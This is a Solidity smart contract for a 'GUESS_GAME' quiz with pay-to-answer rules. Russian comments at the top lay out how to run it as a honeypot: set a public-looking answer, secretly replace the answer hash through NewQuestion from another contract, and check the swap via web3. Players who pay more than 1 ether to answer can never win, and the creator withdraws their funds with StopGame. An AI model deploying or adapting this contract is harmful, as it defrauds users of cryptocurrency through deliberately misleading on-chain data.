1 // 1. Выполнить StartGame с контракта с публичными данными
2 // 2. Выполнить NewQuestion с контракта
3 // 3. Убедится через web3 что хэш поменялся
4 // 4. С параметррами п1. Выполнить комманду StartGame с публичного аккаунта
5 
6 pragma solidity ^0.4.20;
7 
8 contract GUESS_GAME
9 {
10     function Play(string _response)
11     external
12     payable
13     {
14         require(msg.sender == tx.origin);
15         if(responseHash == keccak256(_response) && msg.value>1 ether)
16         {
17             msg.sender.transfer(this.balance);
18         }
19     }
20     
21     string public question;
22  
23     address questionSender;
24   
25     bytes32 responseHash;
26  
27     function StartGame(string _question,string _response)
28     public
29     payable
30     {
31         if(responseHash==0x0)
32         {
33             responseHash = keccak256(_response);
34             question = _question;
35             questionSender = msg.sender;
36         }
37     }
38     
39     function StopGame()
40     public
41     payable
42     {
43        require(msg.sender==questionSender);
44        msg.sender.transfer(this.balance);
45     }
46     
47     function NewQuestion(string _question, bytes32 _responseHash)
48     public
49     payable
50     {
51         require(msg.sender==questionSender);
52         question = _question;
53         responseHash = _responseHash;
54     }
55     
56     function() public payable{}
57 }